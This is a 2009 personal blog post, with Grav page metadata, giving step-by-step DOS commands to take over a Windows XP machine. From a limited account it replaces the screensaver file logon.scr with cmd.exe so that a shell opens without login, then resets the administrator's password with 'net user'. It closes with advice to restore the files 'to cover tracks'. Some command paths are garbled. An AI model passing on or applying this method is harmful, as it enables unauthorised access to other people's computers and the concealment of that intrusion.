---
# http://learn.getgrav.org/content/headers
title: How to hack windows XP admin password
slug: how-to-hack-windows-xp-admin-password
# menu: How to hack windows XP admin password
date: 07-06-2009
published: true
publish_date: 07-06-2009
# unpublish_date: 07-06-2009
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - hack
        - tech
        - windows
        - XP
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [hack,tech,windows,XP]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

If you log into a limited account on your target machine and open up a dos prompt  
then enter this set of commands Exactly:

cd \*drops to root  
cdwindowssystem32 \*directs to the system32 dir  
mkdir temphack \*creates the folder temphack  
copy logon.scr temphacklogon.scr \*backsup logon.scr  
copy cmd.exe temphackcmd.exe \*backsup cmd.exe  
del logon.scr \*deletes original logon.scr  
rename cmd.exe logon.scr \*renames cmd.exe to logon.scr  
exit \*quits dos

Now what you have just done is told the computer to backup the command program  
and the screen saver file, then edits the settings so when the machine boots the  
screen saver you will get an unprotected dos prompt with out logging into XP.

Once this happens if you enter this command minus the quotes

“net user  password”

If the Administrator Account is called Frank and you want the password blah enter this

“net user Frank blah”

and this changes the password on franks machine to blah and your in.

Have fun

p.s: dont forget to copy the contents of temphack back into the system32 dir to cover tracks

Go to our new site- shankee.com
